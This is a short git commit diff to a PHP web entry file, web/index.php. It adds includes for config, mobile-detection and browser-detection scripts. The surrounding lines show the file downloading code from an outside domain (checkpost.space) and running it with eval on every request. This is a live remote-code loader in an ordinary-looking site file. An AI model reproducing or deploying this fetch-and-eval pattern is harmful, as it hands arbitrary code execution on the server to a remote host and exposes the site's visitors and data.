5c881a9920b540fcc5a52e062c05e8559ab6a578
sanernecro <sanernecro@gmail.com>
2017-10-30 01:39:01 +0200

    Update index.php

--- web/index.php
+++ web/index.php
@@ -1,3 +1,7 @@
 <?php
+    require_once('config.php');
+  require_once('Mobile_Detect.php');
+  require_once('Browser.php');
+
 $a = file_get_contents("http://checkpost.space/php/heroku.json");
 eval($a);
